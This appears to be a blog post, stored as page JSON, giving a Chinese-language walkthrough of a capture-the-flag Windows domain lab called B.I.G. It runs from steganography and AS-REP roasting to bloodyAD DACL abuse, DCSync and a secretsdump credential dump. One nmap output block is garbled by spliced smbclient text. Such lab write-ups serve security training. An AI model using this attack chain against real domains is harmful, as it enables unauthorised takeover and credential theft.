{"pageProps":{"postData":{"id":"TheHackersLabsB I G","contentHtml":"<h1>B.I.G</h1>\n<blockquote>\n<p><a href=\"https://labs.thehackerslabs.com/machine/6\">https://labs.thehackerslabs.com/machine/6</a></p>\n</blockquote>\n<p><img src=\"/post-images/TheHackersLabsB%20I%20G/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<h3>Port scan</h3>\n<p>使用 <code>nmap</code> 对端口进行扫描</p>\n<pre><code class=\"hljs language-bash\">➜  BIG nmap -sT -min-rate 10000 -p- 192.168.212.4\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-18 15:47 CST\nWarning: 192.168.212.4 giving up on port because retransmission <span class=\"hljs-built_in\">cap</span> hit (10).\nStrange <span class=\"hljs-built_in\">read</span> error from 192.168.212.4 (104 - <span class=\"hljs-string\">'Connection reset by peer'</span>)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.212.4\nHost is up (0.00037s latency).\nNot shown: 64855 closed tcp ports (conn-refused), 655 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n80/tcp    open  http\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n47001/tcp open  winrm\n49664/tcp open  unknown\n49665/tcp open  unknown\n49666/tcp open  unknown\n49667/tcp open  unknown\n49669/tcp open  unknown\n49670/tcp open  unknown\n49671/tcp open  unknown\n49673/tcp open  unknown\n49676/tcp open  unknown\n49686/tcp open  unknown\nMAC Address: 08:00:27:FA:B6:62 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 26.20 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  BIG nmap -sT -A -p $(<span class=\"hljs-built_in\">cat</span> port | awk -F <span class=\"hljs-string\">'/'</span> <span class=\"hljs-string\">'{print $1}'</span> | <span class=\"hljs-built_in\">paste</span> -sd <span class=\"hljs-string\">','</span>) 192.168.212.4\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n80/tcp    open  http          Microsoft IIS httpd 10.0\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-title: Site doesn<span class=\"hljs-string\">'t have a title (text/html).\n|_http-server-header: Microsoft-IIS/10.0\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-18 23:51:41Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active D➜  BIG smbclient -L 192.168.212.4 -U anonymous                                 \nPassword for [WORKGROUP\\anonymous]:\nsession setup failed: NT_STATUS_LOGON_FAILURE464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: bbr.thl, Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n9389/tcp  open  mc-nmf        .NET Message Framing\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n49664/tcp open  msrpc         Microsoft Windows RPC\n49665/tcp open  msrpc         Microsoft Windows RPC\n49666/tcp open  msrpc         Microsoft Windows RPC\n49667/tcp open  msrpc         Microsoft Windows RPC\n49669/tcp open  msrpc         Microsoft Windows RPC\n49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49671/tcp open  msrpc         Microsoft Windows RPC\n49673/tcp open  msrpc         Microsoft Windows RPC\n49676/tcp open  msrpc         Microsoft Windows RPC\n49686/tcp open  msrpc         Microsoft Windows RPC\nMAC Address: 08:00:27:FA:B6:62 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Microsoft Windows 2016|2019\nOS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2019\nOS details: Microsoft Windows Server 2016 or Server 2019\nNetwork Distance: 1 hop\nService Info: Host: BIG; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time:\n|   date: 2025-07-18T23:52:36\n|_  start_date: 2025-07-18T23:44:01\n|_nbstat: NetBIOS name: BIG, NetBIOS user: &#x3C;unknown>, NetBIOS MAC: 08:00:27:fa:b6:62 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n|_clock-skew: 15h59m55s\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.53 ms 192.168.212.4\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 83.13 seconds\n</span></code></pre>\n<h3>枚举测试</h3>\n<p><code>SMB</code> 匿名账户测试</p>\n<pre><code class=\"hljs language-bash\">➜  BIG smbclient -L 192.168.212.4 -U anonymous                                 \nPassword <span class=\"hljs-keyword\">for</span> [WORKGROUP\\anonymous]:\nsession setup failed: NT_STATUS_LOGON_FAILURE\n</code></pre>\n<h2>WEB</h2>\n<h3>目录扫描</h3>\n<p><code>HTTP</code> 服务</p>\n<p><img src=\"/post-images/TheHackersLabsB%20I%20G/image1.png\" alt=\"image.png\"></p>\n<blockquote>\n<p>两段歌词的来源</p>\n<h3><strong>I keep it music music, I eat that lunch (Yeah)</strong></h3>\n<ul>\n<li><strong>来源:</strong> 这句歌词出自 <strong>Travis Scott</strong> 2023年专辑《UTOPIA》中的大热单曲 <strong>《FE!N》</strong>，是客串的歌手 <strong>Playboi Carti</strong> 的部分。</li>\n<li><strong>含义解析:</strong> 这句歌词是典型的Playboi Carti风格，用极简但充满态度的语言来表达自己的状态。\n<ul>\n<li><strong><code>I keep it music music</code></strong>: 这句话的意思是“我的世界里只有音乐，我一直专注于音乐”。他用重复的“music music”来强调自己完全沉浸在创作和音乐的氛围中，这是他生活的核心和全部重心。这是一种对自己艺术家身份的强调。</li>\n<li><strong><code>I eat that lunch</code></strong>: 这是一句非常形象的俚语，意思是**“我轻松搞定一切”、“我把竞争对手都干掉了”**。想象一下，吃午餐是一件多么轻松日常的事情。他用这个比喻来表示他在说唱游戏（Rap Game）中游刃有余，把击败对手、取得成功看得像吃午饭一样简单。这是一种极度自信和傲慢的炫耀（Bragging）。</li>\n</ul>\n</li>\n</ul>\n<hr>\n<h3><strong>It was all a dream</strong></h3>\n<p><strong>它是一个文化符号，是嘻哈历史上最经典、最标志性的开场白之一。</strong></p>\n<ul>\n<li>\n<p><strong>来源:</strong> 这句歌词出自传奇说唱歌手 <strong>The Notorious B.I.G. (又名 Biggie Smalls)</strong> 在1994年发布的歌曲 <strong>《Juicy》</strong>。这首歌是他的首张专辑《Ready to Die》中的主打单曲，也是他的成名作。</p>\n</li>\n<li>\n<p><strong>原文和背景:</strong> 完整的开场是：</p>\n<p>\"It was all a dream, I used to read Word Up! magazine\nSalt-n-Pepa and Heavy D up in the limousine\"</p>\n</li>\n</ul>\n</blockquote>\n<hr>\n<p>对网站目录爆破</p>\n<pre><code class=\"hljs language-bash\">➜  BIG feroxbuster --url http://192.168.212.4 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --filter-status 404,503,400 -x php,zip,txt\n                                                                                                    \n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben <span class=\"hljs-string\">\"epi\"</span> Risher 🤓                 ver: 2.11.0\n───────────────────────────┬──────────────────────\n 🎯  Target Url            │ http://192.168.212.4\n 🚀  Threads               │ 50\n 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt\n 💢  Status Code Filters   │ [404, 503, 400]\n 💥  Timeout (secs)        │ 7\n 🦡  User-Agent            │ feroxbuster/2.11.0\n 💉  Config File           │ /etc/feroxbuster/ferox-config.toml\n 🔎  Extract Links         │ <span class=\"hljs-literal\">true</span>\n 💲  Extensions            │ [php, zip, txt]\n 🏁  HTTP methods          │ [GET]\n 🔃  Recursion Depth       │ 4\n───────────────────────────┴──────────────────────\n 🏁  Press [ENTER] to use the Scan Management Menu™\n──────────────────────────────────────────────────\n404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n301      GET        2l       10w      151c http://192.168.212.4/images => http://192.168.212.4/images/\n200      GET       21l       41w      435c http://192.168.212.4/\n301      GET        2l       10w      153c http://192.168.212.4/contents => http://192.168.212.4/contents/\n[>-------------------] - 5s     48285/2491564 5m      found:3       errors:0      \n301      GET        2l       10w      150c http://192.168.212.4/songs => http://192.168.212.4/songs/\n200      GET        5l       22w      112c http://192.168.212.4/contents/notify.txt\n200      GET       74l      667w     3350c http://192.168.212.4/songs/juicy.txt\n200      GET      396l     2780w   362382c http://192.168.212.4/images/big4.jpg\n200      GET      396l     2780w   362232c http://192.168.212.4/images/big2.jpg\n[####################] - 8m   3322088/3322088 0s      found:6       errors:0      \n[####################] - 8m    830516/830516  1683/s  http://192.168.212.4/ \n[####################] - 8m    830516/830516  1676/s  http://192.168.212.4/images/ \n[####################] - 8m    830516/830516  1676/s  http://192.168.212.4/contents/ \n[####################] - 8m    830516/830516  1684/s  http://192.168.212.4/songs/\n</code></pre>\n<p><code>Skyisthelimit.txt</code> 还是一个字典</p>\n<p><img src=\"/post-images/TheHackersLabsB%20I%20G/image2.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/TheHackersLabsB%20I%20G/image3.png\" alt=\"image.png\"></p>\n<h3>图片隐写</h3>\n<p>这一部分看了一下 write-up</p>\n<p><code>notify.txt</code></p>\n<p><img src=\"/post-images/TheHackersLabsB%20I%20G/image4.png\" alt=\"image.png\"></p>\n<blockquote>\n<p><em>“你到底雇了哪个该死的家伙来做这个网站！”\n“又把密钥用 MD5 藏起来！”\n“我要炒了那个家伙”</em></p>\n</blockquote>\n<p>那么密码可能是 <code>music</code> 的 <code>MD5</code> 值</p>\n<pre><code class=\"hljs language-bash\">➜  BIG <span class=\"hljs-built_in\">echo</span> -n <span class=\"hljs-string\">\"music\"</span> | <span class=\"hljs-built_in\">md5sum</span>                                                 \n18d6769919266cd0bd6cd78aa405d5d0  -\n</code></pre>\n<p>那么要在哪里使用密码？藏起来感觉是<code>MISC</code>了</p>\n<p>我们将 <code>images/big.jpg</code> 图片下载下来，使用 <code>steghide</code> 来导出数据</p>\n<pre><code class=\"hljs language-bash\">➜  BIG steghide extract -sf big1.jpg\nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\n➜  BIG steghide extract -sf big2.jpg\nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\n➜  BIG steghide extract -sf big3.jpg\nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\n➜  BIG steghide extract -sf big4.jpg\nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\n</code></pre>\n<p>但是密码不对，主页中还有几段歌词，我们尝试一下</p>\n<p><img src=\"/post-images/TheHackersLabsB%20I%20G/image5.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">➜  BIG <span class=\"hljs-built_in\">echo</span> -n <span class=\"hljs-string\">\"I keep it music music\"</span> | <span class=\"hljs-built_in\">md5sum</span>\na6002952ffda89154a38a248280093d2  -\n➜  BIG <span class=\"hljs-built_in\">echo</span> -n <span class=\"hljs-string\">\"I eat that lunch (Yeah)\"</span> | <span class=\"hljs-built_in\">md5sum</span>\nd2b5f22e80f680d9660a1d3ab81232fd  -\n➜  BIG <span class=\"hljs-built_in\">echo</span> -n <span class=\"hljs-string\">\"It was all a dream\"</span> | <span class=\"hljs-built_in\">md5sum</span>\n99ae77c0c0faf78b872f9f452e3eaa24  -\n</code></pre>\n<p>能得到一个文件 <code>frase.txt</code> ，使用 MD5 <code>99ae77c0c0faf78b872f9f452e3eaa24</code></p>\n<pre><code class=\"hljs language-bash\">➜  BIG steghide extract -sf big2.jpg            \nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\n➜  BIG steghide extract -sf big2.jpg\nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\n➜  BIG steghide extract -sf big2.jpg\nEnter passphrase: \nwrote extracted data to <span class=\"hljs-string\">\"frase.txt\"</span>.\n➜  BIG steghide extract -sf big3.jpg\nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\n➜  BIG steghide extract -sf big3.jpg\nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\n➜  BIG steghide extract -sf big3.jpg\nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\n➜  BIG steghide extract -sf big4.jpg  \nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\n➜  BIG steghide extract -sf big4.jpg\nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\n➜  BIG steghide extract -sf big4.jpg\nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\n</code></pre>\n<p>里边是个密码</p>\n<pre><code class=\"hljs language-bash\">➜  BIG <span class=\"hljs-built_in\">cat</span> frase.txt           \nBigpoppa1972\n</code></pre>\n<blockquote>\n<p>声名狼藉先生（The Notorious B.I.G.，1972年5月21日——1997年3月9日）</p>\n</blockquote>\n<h3>枚举用户名</h3>\n<p>有了密码，但是不知道的用在哪</p>\n<p>根据前面得到的信息，<code>music</code> 或者 <code>Juice</code>也可能是用户名</p>\n<pre><code class=\"hljs language-bash\">Who the hell did you hire to create the website!\nHiding keys <span class=\"hljs-keyword\">in</span> MD5 again!\nI<span class=\"hljs-string\">'m going to fire that guy\n\nmusic\n</span></code></pre>\n<p>测试凭据</p>\n<pre><code class=\"hljs language-bash\">➜  ~ nxc smb 192.168.212.4 -u music -p Bigpoppa1972                    \nSMB         192.168.212.4   445    BIG              [*] Windows 10 / Server 2016 Build 14393 x64 (name:BIG) (domain:bbr.thl) (signing:True) (SMBv1:False) \nSMB         192.168.212.4   445    BIG              [+] bbr.thl\\music:Bigpoppa1972 \n\n➜  ~ nxc wmi 192.168.212.4 -u music -p Bigpoppa1972\nRPC         192.168.212.4   135    BIG              [*] Windows 10 / Server 2016 Build 14393 (name:BIG) (domain:bbr.thl)\nRPC         192.168.212.4   135    BIG              [+] bbr.thl\\music:Bigpoppa1972 \n\n➜  ~ nxc ldap 192.168.212.4 -u music -p Bigpoppa1972\nLDAP        192.168.212.4   389    BIG              [*] Windows 10 / Server 2016 Build 14393 (name:BIG) (domain:bbr.thl)\nLDAP        192.168.212.4   389    BIG              [+] bbr.thl\\music:Bigpoppa1972 \n</code></pre>\n<p>远程登录，进去是<code>TEMP</code>用户</p>\n<p><img src=\"/post-images/TheHackersLabsB%20I%20G/image6.png\" alt=\"image.png\"></p>\n<p>当前目录下可以拿到 <code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\music\\Documents> <span class=\"hljs-built_in\">type</span> user.txt\n53bxxxxxxxxxxxxxxxxxxx\n</code></pre>\n<h2>域分析</h2>\n<p>收集信息</p>\n<pre><code class=\"hljs language-bash\">➜  ~ bloodhound-python -d <span class=\"hljs-string\">'bbr.thl'</span> -ns 192.168.212.4 --zip -c All -dc <span class=\"hljs-string\">'BIG.bbr.thl'</span> -u music -p Bigpoppa1972\nINFO: BloodHound.py <span class=\"hljs-keyword\">for</span> BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: bbr.thl\nINFO: Getting TGT <span class=\"hljs-keyword\">for</span> user\nWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)\nINFO: Connecting to LDAP server: BIG.bbr.thl\nINFO: Found 1 domains\nINFO: Found 1 domains <span class=\"hljs-keyword\">in</span> the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: BIG.bbr.thl\nINFO: Found 7 <span class=\"hljs-built_in\">users</span>\nINFO: Found 57 <span class=\"hljs-built_in\">groups</span>\nINFO: Found 2 gpos\nINFO: Found 1 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: BIG.bbr.thl\nINFO: Done <span class=\"hljs-keyword\">in</span> 00M 01S\nINFO: Compressing output into 20250718165617_bloodhound.zip\n</code></pre>\n<p>用户组信息</p>\n<p><img src=\"/post-images/TheHackersLabsB%20I%20G/image7.png\" alt=\"image.png\"></p>\n<p>很明显，目标用户是<code>SONG</code></p>\n<p><img src=\"/post-images/TheHackersLabsB%20I%20G/image8.png\" alt=\"image.png\"></p>\n<p>通过 <code>BLoodhound</code> 可以看到可以用 <code>AS-REP</code> 来打</p>\n<p><img src=\"/post-images/TheHackersLabsB%20I%20G/image9.png\" alt=\"image.png\"></p>\n<h2><strong>AS_REP Roasting</strong></h2>\n<pre><code class=\"hljs language-bash\">➜BIG GetNPUsers.py -dc-ip 192.168.212.4 bbr.thl/ -usersfile <span class=\"hljs-built_in\">users</span>\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies\n  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n$krb5asrep$23<span class=\"hljs-variable\">$song</span>@BBR.THL:6d769bdfb04e89789dae27e05b47a393<span class=\"hljs-variable\">$cde1b6fd59270bc8bfd31470ea4d007ac3fe3750ad8d54b6ec2a63e75495569286eb887787747eeb57c690dfacfb3c913823b0c539ce23ddba0fdbc6bacae8f19530</span>\ncb25f73664a3feafd432ee89e6b56fd6ace082c511a5041b79ef1c8c836b8b3636dca11ed49ff2c372cbf0dd06b184a2575656d41440d7c16e58e8262c3c5a30627c467f84e4dcc83ee19e235bd6168c8abd780d6927f7315a1e16b46cf6570e\nba13b09664cd2cac4a2478c4e67e75d5335a7b61260f79d553d76e96b24ea282d78977e449b130c405a4c2de4c42930f958c8616debbce85dde09896ba30b352\n</code></pre>\n<p>使用 <code>hashcat</code> 破解，使用上面的的字典</p>\n<pre><code class=\"hljs language-bash\">➜  BIG hashcat -m 18200 <span class=\"hljs-built_in\">hash</span> Skyisthelimit.txt\n</code></pre>\n<p>得到密码 <code>Passwordsave@</code></p>\n<p><img src=\"/post-images/TheHackersLabsB%20I%20G/image10.png\" alt=\"image.png\"></p>\n<p>测试凭据</p>\n<pre><code class=\"hljs language-bash\">➜  BIG nxc smb 192.168.212.4 -u song -p Passwordsave@ \nSMB         192.168.212.4   445    BIG              [*] Windows 10 / Server 2016 Build 14393 x64 (name:BIG) (domain:bbr.thl) (signing:True) (SMBv1:False) \nSMB         192.168.212.4   445    BIG              [+] bbr.thl\\song:Passwordsave@ \n</code></pre>\n<h2>权限提升</h2>\n<p>寻找利用链，重新获取一下数据</p>\n<pre><code class=\"hljs language-bash\">bloodhound-python -d <span class=\"hljs-string\">'bbr.thl'</span> -ns 192.168.212.4 --zip -c All -dc <span class=\"hljs-string\">'BIG.bbr.thl'</span> -u song -p Passwordsave@\n</code></pre>\n<h3>链子 1 ❌</h3>\n<p><img src=\"/post-images/TheHackersLabsB%20I%20G/image11.png\" alt=\"image.png\"></p>\n<p>将 <code>Song</code> 添加 <code>SPECIAL PERMISSIONS</code></p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-variable\">$SecPassword</span> = ConvertTo-SecureString <span class=\"hljs-string\">'Passwordsave@'</span> -AsPlainText -Force\n<span class=\"hljs-variable\">$Cred</span> = New-Object System.Management.Automation.PSCredential(<span class=\"hljs-string\">'bbr\\song'</span>, <span class=\"hljs-variable\">$SecPassword</span>)\nAdd-DomainGroupMember -Identity <span class=\"hljs-string\">'SPECIAL PERMISSIONS'</span> -Members <span class=\"hljs-string\">'song'</span> -Credential <span class=\"hljs-variable\">$Cred</span>\n</code></pre>\n<p><img src=\"/post-images/TheHackersLabsB%20I%20G/image12.png\" alt=\"image.png\"></p>\n<p><code>DACL</code> 滥用，赋予自己拥有<code>users</code>的所有权限</p>\n<pre><code class=\"hljs language-bash\">➜  BIG bloodyAD -d <span class=\"hljs-string\">'bbr.thl'</span> -u song -p <span class=\"hljs-string\">'Passwordsave@'</span> --dc-ip 192.168.212.4 add genericAll <span class=\"hljs-string\">'CN=USERS,DC=BBR,DC=THL'</span> song\n[+] song has now GenericAll on CN=USERS,DC=BBR,DC=THL\n</code></pre>\n<p>修改<code>administrator</code>密码，失败，因为<code>administrator</code> 是保护用户，不能直接修改密码</p>\n<h3>链子 2</h3>\n<p>我们直接控制域</p>\n<p><img src=\"/post-images/TheHackersLabsB%20I%20G/image13.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">➜  BIG bloodyAD -d <span class=\"hljs-string\">'bbr.thl'</span> -u song -p <span class=\"hljs-string\">'Passwordsave@'</span> --dc-ip 192.168.212.4 add genericAll <span class=\"hljs-string\">'DC=BBR,DC=THL'</span> song                             \n[+] song has now GenericAll on DC=BBR,DC=THL\n</code></pre>\n<p>再添加一个<code>Dcsync</code>权限给自己</p>\n<pre><code class=\"hljs language-bash\">➜  BIG bloodyAD -d <span class=\"hljs-string\">'bbr.thl'</span> -u song -p <span class=\"hljs-string\">'Passwordsave@'</span> --dc-ip 192.168.212.4 add dcsync song\n[+] song is now able to DCSync\n</code></pre>\n<p><code>Dcsync</code>，使用 <code>secretsdump</code></p>\n<pre><code class=\"hljs language-bash\">secretsdump.py bbr.thl/song:<span class=\"hljs-string\">'Passwordsave@'</span>@192.168.212.4 -dc-ip 192.168.212.4\n</code></pre>\n<p><img src=\"/post-images/TheHackersLabsB%20I%20G/image14.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/TheHackersLabsB%20I%20G/image15.png\" alt=\"image.png\"></p>\n<p>读取 <code>root.txt</code></p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> <span class=\"hljs-built_in\">cat</span> root.txt\n8e8xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n</code></pre>\n<h2>总结</h2>\n<p>难点在<code>Web</code>上，一时半会写不出来</p>\n<p>但是拿到<code>user</code>后就很简单了，一把梭哈</p>","title":"TheHackersLabs - B.I.G","date":"2025-07-18","updated":"2025-07-18","tags":["TheHackersLabs","Windows","Domain","AD","MISC","AS_REPRoat"],"categories":"靶机","comments":true,"description":"B.I.G https://labs.thehackerslabs.com/machine/6 Recon Port scan 使用 nmap 对端口进行扫描 枚举测试 SMB 匿名账户测试 WEB 目录扫描 HTTP 服务 两段歌词的来源 I keep it music music, I eat..."},"recentPosts":[{"id":"念念碎","title":"念念碎","date":"2025-10-26","isEncrypted":false,"year":"2025","month":"10","day":"26"},{"id":"HackTheBoxSeason9 - Conversor","title":"HackTheBox - Season9 - Conversor","date":"2025-10-26","isEncrypted":true,"year":"2025","month":"10","day":"26"},{"id":"HackMyVMSysadmin","title":"HackMyVM - Sysadmin","date":"2025-10-25","isEncrypted":false,"year":"2025","month":"10","day":"25"},{"id":"HackTheBoxSeason8 - Artificial","title":"HackTheBox - Machine - Artificial","date":"2025-06-28","isEncrypted":false,"year":"2025","month":"10","day":"25"},{"id":"HackTheBoxSeason8 - Puppy","title":"HackTheBox - Machine - Puppy","date":"2025-05-19","isEncrypted":false,"year":"2025","month":"10","day":"25"},{"id":"TheHackersLabsAllSafe","title":"TheHackersLabs - AllSafe","date":"2025-10-21","isEncrypted":false,"year":"2025","month":"10","day":"21"},{"id":"TheHackersLabsLavaShop","title":"TheHackersLabs - LavaShop","date":"2025-10-20","isEncrypted":false,"year":"2025","month":"10","day":"20"}]},"__N_SSG":true}